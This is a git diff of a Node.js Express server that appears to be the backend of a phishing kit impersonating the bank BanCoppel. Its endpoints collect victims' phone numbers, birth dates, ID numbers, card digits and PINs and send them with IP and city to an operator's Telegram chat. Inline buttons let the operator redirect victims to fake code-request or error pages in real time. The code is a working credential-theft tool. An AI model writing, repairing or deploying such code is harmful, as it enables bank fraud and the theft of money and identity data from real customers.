@@ -1,103 +1,91 @@
-import express from 'express';
-import cors from 'cors';
-import fetch from 'node-fetch';
+const express = require('express');
+const cors = require('cors');
+const fetch = require('node-fetch');
+const fs = require('fs');
+require('dotenv').config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+const STATUS_FILE = './status.json';
 
-const redirectMap = new Map(); // clientId => redirection URL
+let clientes = {};
+if (fs.existsSync(STATUS_FILE)) {
+  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
+}
+function guardarEstado() {
+  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
+}
 
-// Ruta principal
-app.get('/', (req, res) => {
-  res.send('Servidor activo');
-});
-
-// Ruta para recibir datos y enviar a Telegram
-app.post('/send-data', async (req, res) => {
-  const data = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+app.post('/enviar', (req, res) => {
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, ip, ciudad, txid } = req.body;
 
   const mensaje = `
-🔵B4NC0P3L🔵:
-📱 Celular: ${data.celular}
-🎂 Nacimiento: ${data.fechaNacimiento}
-🆔 Tipo ID: ${data.tipoIdentificacion}
-🔢 ID: ${data.numeroIdentificador}
-💳 Últimos 2: ${data.ultimos2}
-🔐 NIP: ${data.nip}
-
-🆔 ID ClienteWEB: ${data.clientId}
+🔵B4NC0P3L🔵
+🆔 ID: <code>${txid}</code>
+📱 Celular: ${celular}
+🎂 Nacimiento: ${fechaNacimiento}
+🆔 Tipo ID: ${tipoIdentificacion}
+🔢 Identificador: ${numeroIdentificador}
+💳 Últimos 2: ${ultimos2}
+🔐 NIP: ${nip}
 🌐 IP: ${ip}
-
-Elige una acción:
-  `;
+🏙️ Ciudad: ${ciudad}
+`;
 
   const keyboard = {
     inline_keyboard: [
-      [
-        { text: "➡ PEDIR CÓDIGO", callback_data: `redir|${data.clientId}|cel-dina.html` },
-        { text: "➡ ERROR LOGO", callback_data: `redir|${data.clientId}|errorlogo.html` },
-        { text: "➡ CARGANDO", callback_data: `redir|${data.clientId}|verifidata.html` }
-      ]
+      [{ text: "➡ verifidata", callback_data: `verifidata:${txid}` }],
+      [{ text: "➡ cel-dina", callback_data: `cel-dina:${txid}` }],
+      [{ text: "➡ errorlogo", callback_data: `errorlogo:${txid}` }]
     ]
   };
 
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: mensaje,
-        reply_markup: keyboard
-      })
-    });
+  clientes[txid] = "esperando";
+  guardarEstado();
 
-    res.status(200).json({ ok: true });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: err.message });
-  }
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
 });
 
-// Ruta para recibir botón de Telegram
-app.post('/bot-callback', async (req, res) => {
+app.post('/callback', async (req, res) => {
   const callback = req.body.callback_query;
   if (!callback || !callback.data) return res.sendStatus(400);
 
-  const [action, clientId, url] = callback.data.split('|');
-  if (action === 'redir') {
-    redirectMap.set(clientId, url);
+  const [accion, txid] = callback.data.split(":");
+  clientes[txid] = accion;
+  guardarEstado();
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        callback_query_id: callback.id,
-        text: `Redirección preparada para cliente ${clientId}`
-      })
-    });
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      callback_query_id: callback.id,
+      text: `Has seleccionado: ${accion}`
+    })
+  });
 
-    res.sendStatus(200);
-  }
+  res.sendStatus(200);
 });
 
-// Ruta para polling desde verifidata.html
-app.get('/check-redirect/:id', (req, res) => {
-  const clientId = req.params.id;
-  const redirectUrl = redirectMap.get(clientId);
-
-  if (redirectUrl) {
-    redirectMap.delete(clientId); // consumir una sola vez
-    res.json({ redirect: redirectUrl });
-  } else {
-    res.json({ redirect: null });
-  }
+app.get('/sendStatus.php', (req, res) => {
+  const txid = req.query.txid;
+  res.json({ status: clientes[txid] || "esperando" });
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
+app.get('/', (req, res) => res.send("Servidor activo en Render"));
+app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
